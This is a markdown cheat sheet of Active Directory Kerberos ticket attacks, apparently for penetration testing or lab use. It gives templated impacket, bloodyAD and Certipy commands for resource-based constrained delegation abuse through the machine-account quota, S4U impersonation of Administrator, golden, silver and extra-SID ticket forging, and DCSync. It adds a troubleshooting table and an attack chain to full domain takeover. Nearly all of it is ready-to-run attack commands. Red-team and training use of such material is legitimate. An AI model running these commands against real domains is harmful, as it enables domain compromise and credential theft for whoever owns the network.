# Tickets (senior)

Forge or request. Never golden before you have **KRBTGT NT hash + domain SID**.

## Map

| Ticket | Need | Tool |
| --- | --- | --- |
| TGT (legit) | password / hash / PFX | `getTGT`, `certipy auth` |
| TGS / S4U | TGT + SPN, or RBCD | `getST -impersonate` |
| Silver | service NT hash + SID | `ticketer -nthash SVC -spn …` |
| Golden | KRBTGT + SID | `ticketer -nthash KRBTGT` |
| Diamond | KRBTGT + a real TGT to PAC-copy | `ticketer` diamond / Rubeus |
| Sapphire | PKINIT + U2U (PAC from DC) | Certipy / Rubeus |
| Extra-SID | child KRBTGT + parent SID-519 | `ticketer -extra-sid` |
| raiseChild | child DA cred | `impacket-raiseChild` |
| RBCD | GenericWrite on computer + a machine account | `addcomputer` + `getST` |

## MAQ (default 10)

Anyone authenticated can usually create 10 computers. That is your RBCD
principal. Check first:

```
bloodyAD --host {{DC}} -d {{DOMAIN}} -u {{USER}} -p '{{PASS}}' \
  get object . --attr ms-DS-MachineAccountQuota
impacket-addcomputer {{DOMAIN}}/{{USER}}:'{{PASS}}' \
  -computer-name 'FAKE$' -computer-pass 'LabOnly!1' -dc-ip {{DC}}
bloodyAD --host {{DC}} -d {{DOMAIN}} -u {{USER}} -p '{{PASS}}' \
  add rbcd TARGET\$ FAKE\$
impacket-getST -spn cifs/{{TARGET_FQDN}} -impersonate Administrator \
  -dc-ip {{DC}} {{DOMAIN}}/FAKE\$:'LabOnly!1'
export KRB5CCNAME=Administrator.ccache
```

Quota `0` → you need an existing computer you write, or a relay `--delegate-access`.

## RBCD principal: existing SPN beats FAKE$

S4U2Proxy needs the *delegating* principal to have an SPN — a machine account has
one, but so does any **Kerberoastable user**. If you already control such a user
(e.g. guest cracked `CODY_ROY`, SPN `HTTP/…`), make it the RBCD principal and
skip `addcomputer` / MAQ entirely:

```
bloodyAD --host {{DC}} -d {{DOMAIN}} -u {{USER}} -p '{{PASS}}' add rbcd 'AD$' {{SPN_USER}}
# getST as the SPN user. Pick the SPN by the goal:
impacket-getST -spn ldap/{{DC_FQDN}} -impersonate Administrator \
  -dc-ip {{DC}} {{DOMAIN}}/{{SPN_USER}}:'{{PASS}}'      # ldap/ → DCSync grant
impacket-getST -spn cifs/{{DC_FQDN}} -impersonate Administrator \
  -dc-ip {{DC}} {{DOMAIN}}/{{SPN_USER}}:'{{PASS}}'      # cifs/ → C$ / atexec
export KRB5CCNAME=Administrator@ldap_{{DC_FQDN}}@{{DOMAIN}}.ccache
```

`ldap/DC_FQDN` when the plan is DCSync (grant DS-Replication, then secretsdump).
`cifs/DC_FQDN` when the plan is a file grab on `C$` (then `smbclient.py` / `atexec`).

## Golden / extra-SID

```
# domain SID = lookupsid …-500 without the RID
impacket-lookupsid {{DOMAIN}}/{{USER}}:'{{PASS}}'@{{DC}}
impacket-ticketer -nthash {{KRBTGT}} -domain-sid S-1-5-21-… \
  -domain {{DOMAIN}} administrator

# child DA → parent EA (SID filtering OFF, typical parent/child)
impacket-ticketer -nthash {{CHILD_KRBTGT}} -domain-sid {{CHILD_SID}} \
  -domain {{CHILD}} -extra-sid {{PARENT_SID}}-519 administrator
impacket-raiseChild {{CHILD}}/{{DA}}:'{{PASS}}'
```

External / forest trusts usually **filter** SIDs. Do not extra-SID those.
See `trusts.md`.

## Silver

```
impacket-ticketer -nthash {{SVC_HASH}} -domain-sid S-1-5-21-… \
  -domain {{DOMAIN}} -spn cifs/{{HOST}} administrator
```

Only that host / that SPN. Useful after lsassy on a member.

## Fail → next

| Symptom | Next |
| --- | --- |
| `KRB_AP_ERR_SKEW` | `ntpdate -u {{DC}}`, rebuild |
| `KRB_AP_ERR_MODIFIED` | wrong SPN or hostname vs /etc/hosts |
| golden ignored | wrong SID (must be the **domain** SID, not the machine) |
| getST `S_PRINCIPAL_UNKNOWN` | SPN not on that computer. Use BH / findDelegation |
| getST `KDC_ERR_BADOPTION` | RBCD principal has no SPN — use a Kerberoastable user, not a plain user |
| got a ticket but DCSync grant fails | you requested `cifs/`; DCSync needs `ldap/{{DC_FQDN}}` |
| Protected Users | no PTH, no RC4 sometimes. AES TGT / PKINIT |
| extra-SID no EA | SID filtering on. Foreign group / ADCS / MSSQL instead |

## Chain

MAQ → RBCD → getST Administrator → secretsdump.
KRBTGT → golden only as a **lab persistence** demo, not the takeover proof.
Takeover proof is DCSync of every in-scope KRBTGT.
